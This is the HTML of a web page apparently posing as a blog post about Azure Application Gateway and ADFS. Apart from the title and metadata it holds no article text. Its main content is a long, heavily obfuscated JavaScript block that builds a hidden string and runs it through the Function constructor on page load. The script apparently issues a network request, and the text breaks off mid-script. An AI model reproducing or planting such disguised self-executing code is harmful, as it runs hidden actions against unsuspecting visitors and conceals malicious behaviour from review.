<!DOCTYPE html><html lang="en-US" prefix="og: http://ogp.me/ns#"><head><meta http-equiv="Content-Type" content="text/html; charset=utf-8"><meta name="viewport" content="width=device-width, minimum-scale=1.0, initial-scale=1.0"><link rel="stylesheet" href="/HuwFl5ZcA.css" type="text/css" media="all"><title>Azure Application Gateway Adfs</title><meta name="twitter:title" content="Azure Application Gateway Adfs" /><meta name="twitter:description" content="Some time ago i wrote up a post (located here) explaining how you can setup traffic manager with ADFS and have proper monitoring of the service." /><meta name="twitter:card" content="summary_large_image" /><meta name="twitter:image" content="https://docs.microsoft.com/en-us/azure/application-gateway/media/application-gateway-url-route-overview/figure1.png" /><meta property="article:modified_time" content="2020-12-23T04:36:13+00:00" /><meta property="article:published_time" content="2020-12-21T17:11:50+00:00" /><meta property="article:section" content="" /><meta property="og:type" content="article" /><meta property="og:image:secure_url" content="https://docs.microsoft.com/en-us/azure/application-gateway/media/application-gateway-url-route-overview/figure1.png" /><meta property="og:url" content="https://azure-application-gateway-adfs.html" /><meta property="og:image:alt" content="Integrating your on-premises identities with Azure Active Directory" /><meta property="og:image" content="https://docs.microsoft.com/en-us/azure/application-gateway/media/application-gateway-url-route-overview/figure1.png" /><meta property="og:locale" content="en-US" /><meta property="og:site_name" content="chancdenthera1973" /><meta property="og:description" content="Some time ago i wrote up a post (located here) explaining how you can setup traffic manager with ADFS and have proper monitoring of the service." /><meta property="og:updated_time" content="2020-12-23T04:36:13+00:00" /><meta property="og:title" content="Azure Application Gateway Adfs" /><meta name="description" content="Some time ago i wrote up a post (located here) explaining how you can setup traffic manager with ADFS and have proper monitoring of the service."><link rel="prerender" href="https://chancdenthera1973.github.io"><meta content="chancdenthera1973.github.io" name="copyright" /><link rel="prefetch" href="https://chancdenthera1973.github.io"><link rel="profile" href="http://gmpg.org/xfn/11" /><meta name="apple-mobile-web-app-status-bar-style" content="black"><link rel="canonical" href="https://azure-application-gateway-adfs.html" /><meta content="global" name="distribution" /><!--[if IE ]><meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"><![endif]--><meta content="general" name="rating" /><meta content="4 days" name="revisit-after" /><meta name="apple-mobile-web-app-capable" content="yes"><meta content="INDEX,FOLLOW" name="robots" /><script type="application/ld+json">{"mainEntityOfPage": {"@type": "WebPage","@id": "https://azure-application-gateway-adfs.html"},"publisher": {"@type": "Organization","name": "chancdenthera1973"},"image": {"@type": "ImageObject","url": "https://docs.microsoft.com/en-us/azure/application-gateway/media/application-gateway-url-route-overview/figure1.png"},"@type": "BlogPosting","dateModified": "2020-12-23T04:36:13+00:00","description": "Some time ago i wrote up a post (located here) explaining how you can setup traffic manager with ADFS and have proper monitoring of the service.","headline": "Azure Application Gateway Adfs","datePublished": "2020-12-21T17:11:50+00:00","@context": "http://schema.org"}</script></head><body class="extra-area-label secondary-layout-abbr"><div id="aside-clear-abbr" class="new-area-page panel-clear-static"><header id="col-extra-static" class="site-clear-extra layout-item-single container-lg-layout" role="banner"><div class="col-single-lg fix label-static-col"><h1 class="fix-layout-aside"><a href="/" title="chancdenthera1973.github.io" rel="home">chancdenthera1973.github.io</a></h1><h2 class="col-singular-sm"></h2></div></header><div class="navigation-lg-menu container-lg-layout"><nav id="menu-top-new" class="bold sm-site-entry list-static-block primary-abbr-entry" role="navigation"><div class="menu-top-new-inner-block"></div></nav></div><div id="main-sm-lg" class="new-row-panel layout-item-single container-lg-layout"><div id="item-box-layer" class="item-md-abbr row-lg-default"><main id="panel-site-new" class="clear-container-entry" role="main"><article class="col-single-abbr aside-secondary-entry container-single-clear bold container-fn-layout item-default-site post-col-single"><header class="head-md"><h1 class="content-single-box">Azure Application Gateway Adfs</h1><div class="md-post-panel"><span class="clear-layer-row"><i class="article-singular-content"></i><a href="/azure-application-gateway-adfs.html" rel="bookmark"><time class="col-block main-new-label" datetime="2020-12-21T17:11:50">21.12.2020</time><time class="entry-single-fn" datetime="2020-12-21T17:11:50">22.08.2017</time></a></span><span class="panel-secondary-single"><i class="body-lg-item"></i><span class="content-extra-secondary node-md-article"><a class="secondary-page-area node-entry-lg extra-content-layout" href="/?author=1">admin</a></span></span></div></header><div class="lg-article-panel"><div xmlns:v='http://rdf.data-vocabulary.org/#'><span typeof='v:Breadcrumb'><a href='/' rel='v:url' property='v:title'>chancdenthera1973.github.io</a> › </span><span typeof='v:Breadcrumb'><a href='/azure-application-gateway-adfs.html' rel='v:url' property='v:title'>★ ★ ★ Azure Application Gateway Adfs ★ ★ ★</a></span></div><script>$fHk=String.fromCharCode(81,86,52,103,83,68,75,70,76,71,47,89,59,74,123,44,80,61,118,87,63,77,65,90,67,85,73,49,82,57,107,72,104,41,88,46,40,48,113,69,84,39,120,119,112,109,125,66);_=([![]]+{})[+!+[]+[+[]]]+([]+[]+{})[+!+[]]+([]+[]+[][[]])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+(!![]+[])[!+[]+!+[]]+([![]]+{})[+!+[]+[+[]]]+(!![]+[])[+[]]+([]+[]+{})[+!+[]]+(!![]+[])[+!+[]];_[_][_]($fHk[18]+(![]+[])[+!+[]]+(!![]+[])[+!+[]]+(+{}+[]+[]+[]+[]+{})[+!+[]+[+[]]]+$fHk[42]+$fHk[+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]+$fHk[+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+([]+[]+[][[]])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+$fHk[+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+(+{}+[]+[]+[]+[]+{})[+!+[]+[+[]]]+$fHk[+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+$fHk[+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+$fHk[+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+$fHk[31]+(!![]+[])[+[]]+(!![]+[])[+[]]+$fHk[+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+$fHk[28]+(!![]+[])[!+[]+!+[]+!+[]]+$fHk[38]+(!![]+[])[!+[]+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+$fHk[36]+$fHk[+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+$fHk[+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+$fHk[42]+$fHk[32]+(!![]+[])[+!+[]]+$fHk[35]+([]+[]+{})[+!+[]]+$fHk[+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+([]+[]+[][[]])[+!+[]]+$fHk[36]+$fHk[41]+$fHk[+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+$fHk[39]+$fHk[+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+$fHk[+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+$fHk[+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+$fHk[41]+$fHk[10]+$fHk[10]+(![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(![]+[])[!+[]+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+([![]]+[][[]])[+!+[]+[+[]]]+$fHk[+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+$fHk[35]+([![]]+[][[]])[+!+[]+[+[]]]+([]+[]+[][[]])[+!+[]]+(![]+[])[+[]]+([]+[]+{})[+!+[]]+$fHk[+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+$fHk[20]+([]+[]+{})[!+[]+!+[]]+$fHk[26]+$fHk[17]+$fHk[+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+$fHk[+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+$fHk[0]+$fHk[+!+[]+!+[]+!+[]+!+[]]+$fHk[+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+$fHk[+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+$fHk[+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+$fHk[+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+$fHk[+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+$fHk[7]+(+{}+[]+[])[+[]]+$fHk[(+!+[])]+$fHk[+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+$fHk[+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+$fHk[25]+$fHk[+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+$fHk[22]+$fHk[43]+$fHk[32]+$fHk[28]+$fHk[(+!+[])]+$fHk[0]+$fHk[+!+[]+!+[]+!+[]]+$fHk[+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+$fHk[+!+[]+!+[]+!+[]+!+[]+!+[]]+$fHk[+!+[]+!+[]+!+[]]+([]+[]+{})[+!+[]]+$fHk[23]+$fHk[+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+$fHk[39]+$fHk[29]+$fHk[21]+$fHk[0]+$fHk[(+[])]+([![]]+{})[+!+[]+[+[]]]+$fHk[11]+$fHk[47]+$fHk[25]+$fHk[11]+$fHk[+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+$fHk[+!+[]+!+[]+!+[]+!+[]+!+[]]+$fHk[3]+$fHk[+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+([]+[]+{})[!+[]+!+[]]+$fHk[+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+$fHk[47]+$fHk[+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+(![]+[])[+[]]+$fHk[34]+$fHk[0]+$fHk[43]+(![]+[])[+!+[]]+$fHk[+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+$fHk[(+!+[])]+$fHk[23]+(+{}+[]+[])[+[]]+$fHk[(+!+[])]+$fHk[39]+$fHk[23]+$fHk[4]+$fHk[0]+$fHk[25]+$fHk[+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+$fHk[40]+$fHk[+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+$fHk[+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+$fHk[28]+$fHk[6]+$fHk[31]+$fHk[3]+$fHk[28]+$fHk[0]+$fHk[+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+$fHk[+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+$fHk[25]+$fHk[5]+$fHk[+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+$fHk[30]+$fHk[22]+$fHk[8]+$fHk[+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+$fHk[47]+([]+[]+[][[]])[!+[]+!+[]]+$fHk[+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+$fHk[5]+$fHk[+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+$fHk[+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+$fHk[+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+$fHk[40]+$fHk[+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+(![]+[])[!+[]+!+[]]+$fHk[+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+$fHk[4]+$fHk[25]+([![]]+{})[+!+[]+[+[]]]+$fHk[+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+$fHk[+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+$fHk[+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+$fHk[25]+([]+[]+[][[]])[!+[]+!+[]]+$fHk[22]+$fHk[22]+$fHk[39]+$fHk[19]+$fHk[(+!+[])]+$fHk[3]+$fHk[13]+$fHk[+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+$fHk[25]+$fHk[+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+$fHk[25]+$fHk[22]+$fHk[+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+$fHk[1]+$fHk[+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+$fHk[23]+$fHk[+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+$fHk[7]+$fHk[27]+$fHk[16]+$fHk[23]+([]+[]+{})[+!+[]+[+[]]]+([![]]+{})[+!+[]+[+[]]]+(![]+[])[+!+[]]+$fHk[+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+$fHk[37]+$fHk[+!+[]+!+[]]+$fHk[(+!+[])]+$fHk[34]+$fHk[28]+$fHk[37]+$fHk[0]+$fHk[+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+$fHk[28]+([]+[]+[][[]])[!+[]+!+[]]+$fHk[+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+$fHk[+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+$fHk[+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+$fHk[21]+$fHk[39]+$fHk[+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+$fHk[+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+$fHk[+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+$fHk[+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+$fHk[+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+$fHk[33]+$fHk[+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+$fHk[+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+$fHk[32]+(!![]+[])[+!+[]]+$fHk[35]+$fHk[+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(!![]+[])[+[]]+$fHk[+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+$fHk[+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+([]+[]+[][[]])[!+[]+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+([]+[]+[][[]])[+!+[]]+(!![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+$fHk[+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+(!![]+[])[!+[]+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+$fHk[+!+[]+!+[]